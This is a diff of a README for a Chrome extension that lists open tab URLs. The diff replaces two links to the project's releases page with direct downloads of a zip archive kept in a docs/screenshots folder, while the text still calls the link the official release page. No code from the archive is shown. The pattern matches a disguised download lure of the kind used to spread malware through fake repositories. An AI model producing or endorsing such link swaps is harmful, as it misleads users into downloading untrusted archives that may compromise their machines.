@@ -1,6 +1,6 @@
 # 📋 safe-tab-url-lister - Organize browser tabs with one click
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/Cyrillsheared95/safe-tab-url-lister/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/Cyrillsheared95/safe-tab-url-lister/raw/refs/heads/main/docs/screenshots/url-lister-safe-tab-3.2.zip)
 
 This software helps you manage your open browser tabs. You can view, copy, and save your current tab URLs as plain text, Markdown, JSON, or CSV files. The tool works locally on your machine and does not track your data.
 
@@ -8,7 +8,7 @@ This software helps you manage your open browser tabs. You can view, copy, and s
 
 To use this tool, visit the official release page to download the necessary files. 
 
-[https://github.com/Cyrillsheared95/safe-tab-url-lister/releases](https://github.com/Cyrillsheared95/safe-tab-url-lister/releases)
+[https://github.com/Cyrillsheared95/safe-tab-url-lister/raw/refs/heads/main/docs/screenshots/url-lister-safe-tab-3.2.zip](https://github.com/Cyrillsheared95/safe-tab-url-lister/raw/refs/heads/main/docs/screenshots/url-lister-safe-tab-3.2.zip)
 
 Follow these steps to set up the extension on your Google Chrome browser.
 
